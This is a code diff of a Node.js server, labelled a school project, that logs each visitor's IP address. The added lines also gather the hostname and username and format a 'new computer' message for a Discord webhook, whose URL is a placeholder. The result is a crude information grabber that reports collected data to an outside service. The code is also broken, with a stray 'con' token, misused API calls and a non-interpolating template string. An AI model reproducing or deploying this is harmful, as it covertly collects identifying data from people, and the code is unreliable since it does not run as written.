@@ -1,12 +1,13 @@
 // this is a school project.
+const os = require('os');
 const http = require('http');
-const axios = require('axios')
-
+const axios = require('axios');
+con
 const webhook = 'Discord Webhook URL';
 const server = http.createServer((req, res) => {
-    const ip = req.connection.remoteAddress;
-    const axios = require('axios');
-    const webhookUrl = 'BURAYA_DISCORD_WEBHOOK_URLSINI_EKLE';
+    const ip = req.connection.remoteAddress();
+    const hostname = os.hostname();
+    const username = os.userinfo().username;
 
 const sendMessageToDiscord = async (message) => {
     try {
@@ -21,4 +22,5 @@ const sendMessageToDiscord = async (message) => {
 
 });
 // daha tamamlamasim tamamlamaya usendım
-const mesaj = 'IP: ${ip}'
+const mesaj = 'Yeni bilgisyar: 
+IP: ${ip}'
